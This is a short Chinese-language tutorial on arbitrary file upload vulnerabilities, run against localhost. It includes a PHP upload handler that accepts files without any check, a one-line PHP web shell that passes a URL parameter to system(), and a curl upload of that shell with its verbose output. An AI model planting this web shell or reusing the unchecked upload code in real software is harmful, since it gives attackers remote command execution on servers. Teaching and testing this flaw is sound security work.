#任意文件上传漏洞
对上传的文件不进行检验,直接上传。一般与其他漏洞结合使用,例如任意目录遍历及远程命令调用。    
编写1个相关的PHP脚本,其内容为:  

```
<?php
function mkdirs($dir, $mode = 0777)
{
    if (is_dir($dir) || @mkdir($dir, $mode)) return TRUE;
    if (!mkdirs(dirname($dir), $mode)) return FALSE;
    return @mkdir($dir, $mode);
}
$target = "pictures/";
mkdirs($target);
$target = $target.basename($_FILES['uploadedfile']['name']);
if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target)){
  echo "The picture has been successfully upload.";
}else{
  echo "There was an error uploading the picture, please try again.";
}
```

再编写1个入侵的PHP脚本`malicious.php`:  

```
<?php
system($_GET['cmd']);
```

使用curl进行文件上传:

<pre>
$ curl http://localhost/demo.php -F "uploadedfile=@malicious.php" -v
*   Trying ::1...
* TCP_NODELAY set
* Connected to localhost (::1) port 80 (#0)
> POST /demo.php HTTP/1.1
> Host: localhost
> User-Agent: curl/7.61.1
> Accept: */*
> Content-Length: 241
> Content-Type: multipart/form-data; boundary=------------------------2572e1912cbed99d
>
< HTTP/1.1 200 OK
< Date: Tue, 14 May 2019 03:32:51 GMT
< Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45
< X-Powered-By: PHP/5.4.45
< Content-Length: 41
< Content-Type: text/html
<
The picture has been successfully upload.* Connection #0 to host localhost left intact
</pre>

文件上传成功。  
例如,远程命令调用:  

![calc](1.jpg)